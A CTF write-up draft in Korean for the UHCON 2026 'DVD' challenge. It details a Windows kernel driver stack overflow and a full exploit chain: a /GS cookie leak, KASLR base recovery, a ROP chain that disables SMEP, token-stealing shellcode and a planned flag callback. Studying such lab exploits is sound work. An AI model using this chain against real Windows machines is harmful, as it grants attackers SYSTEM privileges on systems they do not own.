# UHCON 2026 FINAL — DVD 풀이 초안

> 상태: 로컬 SYSTEM 권한 상승·더미 플래그 회수까지 통합 검증 성공, 원격 플래그 미획득
> 원칙: 아래에서 **관찰**은 파일·코드·실행 결과로 직접 확인한 사실, **추론**은 그 사실을 이용한 익스플로잇 설계, **미확정**은 아직 실행으로 검증하지 못한 항목을 뜻한다.

## 1. 문제 개요와 서버 프로토콜

대상 서비스는 `107.191.60.197:1339`이며, x64 Windows PE를 받아 Windows VM 안에서 일반 사용자 권한으로 실행한다.

### 관찰

1. 서버는 8바이트 challenge와 3바이트 target을 보낸다.
2. 클라이언트는 `SHA256(challenge || solution)`의 앞 3바이트가 target과 같은 PoW solution을 제출해야 한다. 전송 문자열이 hex이므로 실제 해시는 `bytes.fromhex(challenge + solution)`에 대해 계산한다.
3. PoW 통과 뒤 최대 10 MiB의 base64 인코딩 Windows PE를 받는다.
4. VM에서 서버는 실제 플래그를 `C:\flag.txt`에 만들고, SYSTEM만 읽을 수 있도록 ACL을 설정한다.
5. `chall.sys`를 `ctf` 커널 서비스로 적재한 뒤 업로드한 EXE를 `user` 계정의 예약 작업으로 실행한다.
6. 업로드 EXE의 표준 출력은 네트워크 클라이언트로 전달되지 않으며, 서버는 최대 180초 뒤 VM을 종료한다.

### 추론

따라서 단순히 커널 권한을 얻는 것으로는 원격 정답을 볼 수 없다. 익스플로잇은 SYSTEM 토큰 획득 후 `C:\flag.txt`를 읽고, 명시적으로 승인된 외부 종단으로 값을 전송해야 한다.

### 미확정

- 사용할 콜백 host/port가 아직 정해지지 않았다.
- 외부 서비스나 제3자 webhook은 승인 없이 사용하지 않았다.
- 대회 사이트에 제출할 실제 플래그는 아직 획득하지 않았다.

## 2. 드라이버 공격 표면

분석 대상 `chall.sys`의 SHA-256은 다음과 같다.

```text
da4a95a54660c5213147a24e7c232f972a93e634c5de8079be6914ddd91b9882
```

### 관찰

- 장치 심볼릭 링크: `\\.\VulnDriver`
- WRITE IOCTL: `0x222000`
- READ IOCTL: `0x222004`
- 두 요청 모두 `METHOD_BUFFERED`를 사용한다.

핵심 코드는 다음과 동등하다.

```c
void vuln_read(void *SystemBuffer, uint32_t OutputLength) {
    uint8_t local[0x40];
    memset(local, 0xAA, sizeof(local));
    memcpy(SystemBuffer, local, OutputLength);
}

void vuln_write(void *SystemBuffer, uint32_t InputLength) {
    uint8_t local[0x40];
    memcpy(local, SystemBuffer, InputLength);
}
```

READ는 사용자가 정한 길이만큼 커널 스택을 내보내고, WRITE는 사용자가 정한 길이만큼 0x40바이트 지역 버퍼에 복사한다. 즉 한 쌍의 OOB read/stack overflow 취약점이다.

지역 버퍼 시작을 `B`라 하면 확인된 프레임 배치는 다음과 같다.

| 오프셋 | 내용 |
|---:|---|
| `B+0x00..0x3f` | 0xAA로 초기화되는 지역 버퍼 |
| `B+0x40` | 인코딩된 `/GS` 프레임 쿠키 |
| `B+0x58` | saved RDI |
| `B+0x60` | saved RSI |
| `B+0x68` | 복귀 주소 `chall_base + 0x1131` |

WRITE 뒤 디스패처의 정상 스택 포인터를 `D`라 두면 `D = B + 0x70`이다. `/GS`를 우회하려면 READ에서 누출한 인코딩된 쿠키를 WRITE payload의 같은 위치에 그대로 되돌리고, 비휘발 레지스터 슬롯도 함께 보존해야 한다.

### 추론

동일 사용자 스레드에서 같은 깊이의 동기식 READ와 WRITE를 연달아 호출하면 두 커널 핸들러의 프레임 배치를 재사용할 수 있다. 구현은 스레드를 한 CPU에 고정하고 READ를 세 번 반복하여 cookie, saved RDI, saved RSI, return address가 모두 같은지 확인한 뒤, 마지막 READ에서 바로 WRITE로 이어 간다.

이는 READ 프레임의 반복 안정성을 검사하는 것이며, WRITE 프레임과 완전히 동일하다는 사실 자체를 실행 전에 증명하는 검사는 아니다. 이 점은 통합 실행으로 확인해야 한다.

## 3. 커널 이미지와 런타임 주소 해석

WOF 압축을 복원한 커널 파일은 다음과 같다.

```text
파일: work/kernel/ntoskrnl-decompressed.exe
크기: 13,131,136 bytes
SHA-256: 4a6af9a3dbbeb440c4a9fbe8a4d6832eae751ac3a85860d860b8313a737a2e3a
SizeOfImage: 0x1450000
```

파일 리소스의 버전은 `10.0.26100.9711`로 표시되지만 로컬 VM의 `ver` 출력은 `10.0.26300.9711`이었다. 이 불일치 때문에 고정 절대 주소 대신 실행 시 커널 베이스와 로컬 매핑의 RVA를 결합한다.

### 관찰

- 표준 사용자에서 `NtQuerySystemInformation(SystemModuleInformation)` 호출 자체는 성공했고 154개 모듈과 `ntoskrnl.exe`의 크기 `0x1450000`도 반환했다. 그러나 `ImageBase`는 `0`으로 마스킹됐다.
- `C:\Windows\System32\ntoskrnl.exe`를 `DONT_RESOLVE_DLL_REFERENCES`로 사용자 공간에 매핑할 수 있다.
- 로컬 이미지의 크기와 시스템 모듈이 보고한 크기를 대조한다.
- 실행 가능하면서 `IMAGE_SCN_MEM_DISCARDABLE`이 아닌 섹션만 가젯 검색 대상으로 삼는다.

따라서 SystemModuleInformation은 크기·경로 교차검증에만 쓰고, 실제 KASLR 베이스는 별도의 discovery READ에서 구한다. 로컬 probe에서 직접 확인한 핵심 누출은 다음과 같다.

```text
leak[B+0x68]  = fffff80215451131
leak[B+0xC8]  = fffff80286c9b534
leak[B+0x108] = fffff80286c9b2a6
```

첫 값은 드라이버 복귀 주소이므로 다음 식으로 드라이버 베이스를 얻는다.

```text
chall_base = fffff80215451131 - 0x1131
           = fffff80215450000
```

`B+0xC8`은 상위 `IofCallDriver` 경로의 복귀 주소다. 로컬 커널의 비폐기 실행 섹션에서 2 MiB 정렬 후보와 유효한 `E8`/`FF15` call-return을 대조하면 하위 21비트가 맞는 후보는 `nt+0x29b534` 하나뿐이었다. 두 번째 누출도 `nt+0x29b2a6`으로 독립적으로 같은 베이스를 준다.

```text
nt_base_a = fffff80286c9b534 - 0x29b534
nt_base_b = fffff80286c9b2a6 - 0x29b2a6
          = fffff80286a00000
```

구현은 canonical kernel pointer, 2 MiB 정렬, `SizeOfImage` 범위, 실행·비폐기 섹션, 정확한 call-return 바이트, 두 누출의 동일 베이스를 모두 요구한다. 고정 절대 주소를 쓰는 것이 아니라 현재 시스템의 로컬 `ntoskrnl.exe`에서 일치하는 반환 RVA를 찾는다.

초기 분석에서 찾았던 `nt+0xbeb7c3: mov cr4,rax; ret`는 discardable `MINIEX` 섹션에 있었다. 부팅 후 해당 코드가 남는다고 가정할 수 없으므로 최종 체인에서 제외했다.

## 4. 비폐기 `.text`만 사용하는 SMEP 우회 ROP

최종 체인의 모든 커널 가젯은 비폐기 실행 섹션에 있다.

| RVA | 의미 |
|---:|---|
| `nt+0x4b7f20` | 현재 CR4를 RCX로 읽고, 두 분기 모두 RCX를 보존한 채 반환 |
| `nt+0x205022` | `pop rax ; ret` |
| `nt+0x373dcb` | `and rcx,rax ; cmp rcx,r8 ; sete r9b ; mov eax,r9d ; ret` |
| `nt+0x4b7f37` | `mov cr4,rcx ; ret` |

실제 익스플로잇은 바이트 패턴을 런타임에 다시 검색하며, 고정 RVA는 분석 결과를 설명하기 위한 값이다. `nt+0x4b7f20` 리더와 `nt+0x373dcb` AND 가젯은 각각 유일 일치를 요구하고, `pop rax; ret`는 첫 번째 비폐기 실행 섹션 일치를 쓴다. CR4 writer 바이트도 별도로 확인한다.

payload의 ROP 배치는 다음과 같다.

```text
B+0x68  nt+0x4b7f20                  ; RCX = current CR4
B+0x70  nt+0x205022                  ; pop rax ; ret
B+0x78  0xffffffffffefffff           ; clear CR4.SMEP (bit 20)
B+0x80  nt+0x373dcb                  ; RCX &= mask
B+0x88  nt+0x4b7f37                  ; mov cr4,rcx ; ret
B+0x90  user RWX shellcode address
```

전체 WRITE 입력 길이는 정확히 `0x98`이다. 현재 CR4를 읽은 뒤 bit 20만 지우므로 다른 CR4 비트를 임의로 추측하지 않는다. 익스플로잇 스레드를 READ 전부터 WRITE 복귀까지 같은 CPU에 고정하는 이유도 CR4가 CPU별 상태이기 때문이다.

## 5. 커널 셸코드와 토큰 교체

사용자 공간에는 100바이트 커널 셸코드 템플릿을 RWX로 할당한 뒤, 실행 중인 커널 이미지에서 알아낸 값들을 marker 위치에 패치한다.

### 관찰

- `PsGetCurrentProcess`의 실제 바이트는 다음 형태다.

```text
65 48 8b 04 25 88 01 00 00 48 8b 80 b8 00 00 00 c3
```

- 이를 통해 현재 빌드의 `gs:[0x188]` KTHREAD 주소와 `KTHREAD+0xb8`의 EPROCESS 포인터를 동적으로 추론한다.
- `PsInitialSystemProcess` export RVA는 `0xfc6ab0`이다.
- `PsReferencePrimaryToken` 내부 helper의 `[rcx+offset]` 접근에서 Token 필드 오프셋 `0x248`을 추론했다.

### 셸코드 동작

1. ROP에서 전달된 SMEP가 꺼진 CR4 값을 `R10`에 보관한다.
2. `gs:[KTHREAD offset]`와 KTHREAD의 process offset을 이용해 현재 EPROCESS를 얻는다.
3. 런타임 주소의 `PsInitialSystemProcess`를 역참조하여 SYSTEM EPROCESS를 얻는다.
4. SYSTEM EPROCESS의 `Token` fast-ref qword를 현재 EPROCESS의 같은 오프셋에 그대로 복사한다.
5. `bts rcx,20`으로 CR4.SMEP를 다시 켠다.
6. WRITE 핸들러가 정상적으로 빠져나갈 수 있도록 스택 슬롯을 복구한다.
7. 커널 CR4 writer로 점프하고, 그 뒤 `chall+0x10ff` 연속 실행 지점으로 돌아간다.

셸코드 진입 시 `RSP = B+0x98 = D+0x28`이다. ROP로 덮인 `D+0x20` qword를 원래의 결합 값 `0x0000009800000000`으로 `[rsp-8]`에 복구한다. 또한 `[rsp-0x30]`, 즉 `B+0x68`에 `chall+0x10ff`를 넣고 `sub rsp,0x30` 후 writer로 점프한다. writer의 `ret`이 해당 주소를 꺼내므로 최종적으로 `RSP=D`에서 디스패처 정상 흐름이 재개된다.

## 6. 사용자 모드 익스플로잇 흐름

`solver/exploit.c`의 전체 흐름은 다음과 같다.

1. SystemModuleInformation은 선택적으로 조회하여 이미지 크기와 모듈 이름만 교차검증한다. 베이스가 0으로 마스킹돼도 중단하지 않는다.
2. 로컬 ntoskrnl을 매핑하고 PE 및 이미지 크기를 검증한다.
3. 비폐기 실행 섹션에서 CR4 ROP 가젯을 동적으로 찾는다.
4. `PsGetCurrentProcess`, `PsInitialSystemProcess`, `PsReferencePrimaryToken` 구현에서 필요한 오프셋을 추론한다.
5. `\\.\VulnDriver`를 열고 현재 스레드를 한 CPU에 고정한다.
6. 별도의 discovery READ를 한 번 실행해 `chall_base`와 `nt_base`를 계산하고 두 nt call-return 누출로 교차검증한다.
7. 계산한 런타임 주소로 RWX 셸코드와 ROP payload를 패치하고 instruction cache를 flush한다.
8. 그 뒤 새 READ를 세 번 호출하여 0xAA prefix와 cookie·RDI·RSI·driver return, 두 nt call-return의 안정성을 검사한다.
9. 마지막 READ 직후 추가 할당이나 로깅 없이 누출 슬롯을 0x98바이트 WRITE payload에 복원하고 ROP 체인을 실행한다.
10. CPU affinity를 되돌리고 현재 토큰이 SYSTEM SID인지 확인한다.
11. `C:\flag.txt`를 읽어 `C:\Users\Public\result.txt`에 기록한다.
12. 콜백이 컴파일된 빌드라면 같은 플래그를 승인된 종단으로 전송한다.

로컬 기본 빌드는 콜백 매크로가 빈 문자열/0이므로 네트워크 전송 코드가 컴파일 결과에서 제거되었다.

최종 로컬 성공 검증 소스에서 재빌드한 `solver/exploit.exe`는 96,128 bytes이고 SHA-256은 `AAD8AE5F0F6A1DE4C702645EE4DBE86FB31184EC69DC8114164DE28FBA3A6374`다. 이 빌드는 콜백이 비활성이라 import는 `ADVAPI32`, `KERNEL32`, `msvcrt`뿐이며 WS2_32가 없다. 통합 성공 뒤 마지막으로 적용한 변경은 READ 최소 길이를 실제 참조 범위 `0x110`으로 강화한 fail-closed 검사이며, 로컬 반환 길이 `0x200`에는 영향을 주지 않는다.

따라서 이 파일은 **로컬 검증 전용**이며 원격 서버에 그대로 업로드하면 안 된다. 원격용은 승인된 회수 경로를 명시하여 별도로 빌드하고, 필요한 네트워크 import 및 내장 설정을 확인해야 한다.

`solver/build_remote.py`는 승인된 callback host/port를 컴파일 매크로로 넣고, 결과 PE의 10 MiB 제한·내장 host·`WS2_32.dll` import를 확인한다. `solver/listen.py`는 소유한 수신점에서 플래그를 받고, `solver/submit.py`는 PoW 계산·PE 업로드·서버 transcript 저장을 담당한다.

## 7. 로컬 통합 검증 상태

### 관찰

- 보존 오버레이: `work/local-overlay-4g.qcow2`
- VM에서 `whoami`는 `nt authority\system`이었다. 이는 QGA가 SYSTEM으로 동작한다는 뜻이며 익스플로잇 성공 증거가 아니다.
- VM `ver` 출력은 `Microsoft Windows [Version 10.0.26300.9711]`이었다.
- `C:\\flag.txt`에는 로컬 전용 더미 값 `UHCON{LOCAL_DVD_INTEGRATION_TEST}`를 넣고 SYSTEM 읽기 전용 ACL을 적용했다.
- 드라이버 서비스 `ctf`는 최종 재시험에서 즉시 `RUNNING` 상태가 됐다. 앞선 QGA 무응답은 드라이버 bugcheck가 아니라 당시 VM/WSL 지연이었다.
- `user` 계정에 로컬 검증용 배치 로그온 권한만 추가하고 비대화형 예약 작업으로 익스플로잇을 실행했다.
- 표준 사용자 probe는 READ 512바이트를 성공적으로 회수했고, SystemModuleInformation의 주소 마스킹과 위 KASLR fallback 값을 확인했다.
- 최종 실행 로그는 다음을 직접 기록했다.

```text
leak bases: nt=fffff80286a00000 ret1_rva=0029b534 ret2_rva=0029b2a6 chall=fffff80215450000
gadgets: reader=fffff80286eb7f20 pop_rax=fffff80286c05022 and=fffff80286d73dcb writer=fffff80286eb7f37
offsets: gs_thread=188 thread_process=b8 token=248 PsInitialSystemProcess=fffff802879c6ab0
WRITE returned=1 winerr=0
token_is_system=1
flag_read=1 length=33 callback=disabled:0
```

- `C:\Users\Public\result.txt`를 회수해 다음 로컬 더미 플래그와 정확히 일치함을 확인했다.

```text
UHCON{LOCAL_DVD_INTEGRATION_TEST}
```

따라서 `/GS` 쿠키 재사용, READ/WRITE 프레임 동일성, 비폐기 ROP, SMEP 해제·복구, 사용자 RWX 셸코드 실행, SYSTEM 토큰 교체, 드라이버 정상 복귀와 플래그 읽기까지 한 번의 통합 실행으로 검증됐다. 로컬 더미 값은 대회 정답이 아니다.

### 미확정

- 실제 원격 서비스에서 같은 익스플로잇을 실행하고 플래그를 회수하는 단계는 아직 수행하지 않았다.
- 실제 `UHCON{...}` 플래그와 대회 사이트 제출 결과는 아직 없다.

## 8. 남은 위험과 후속 작업

1. **원격 실행 차이**: 로컬 VM에서는 CET shadow stack이 현재 ROP를 막지 않았고 READ/WRITE 프레임 재사용도 성공했다. 원격 인스턴스가 같은 이미지·정책인지 실제 실행으로 마지막 확인이 필요하다.
2. **회수 경로**: 업로드 EXE의 stdout은 전달되지 않으므로, 승인된 콜백이나 기존 서버 연결을 안전하게 재사용하는 회수 경로가 필요하다.
3. **180초 제한**: 원격 전송은 짧은 timeout과 제한된 retry로 실패를 결정적으로 끝내야 한다.
4. **원격 전용 빌드 검증**: 업로드 전 PE 크기, import, 내장 endpoint, 콜백 비활성 로컬 빌드와의 혼동 여부를 확인해야 한다.
5. **제출**: 실제 `UHCON{...}`를 받은 즉시 기록하고 대회 사이트에 제출한 응답까지 증거로 남긴다.

## 9. 현재 결론

취약점과 익스플로잇 체인은 로컬 통합 실행까지 완성됐다. 핵심은 discovery READ로 주소 마스킹을 우회해 커널·드라이버 베이스를 얻고, 마지막 안정성 READ에서 `/GS` 프레임을 그대로 확보한 뒤, 비폐기 `.text` 가젯만으로 현재 CR4의 SMEP 비트를 잠시 지우는 것이다. 빌드별 오프셋을 런타임에 추론한 100바이트 셸코드는 SYSTEM 토큰을 복사하고 스택과 CR4를 모두 원상 복구했으며, WRITE 정상 반환과 SYSTEM SID·더미 플래그 읽기로 이를 확인했다.

현재 남은 것은 원격 회수와 제출이다. 로컬 더미 플래그는 실제 정답이 아니므로, 최종본에는 원격 실행 결과·실제 플래그·제출 응답을 추가해야 한다.
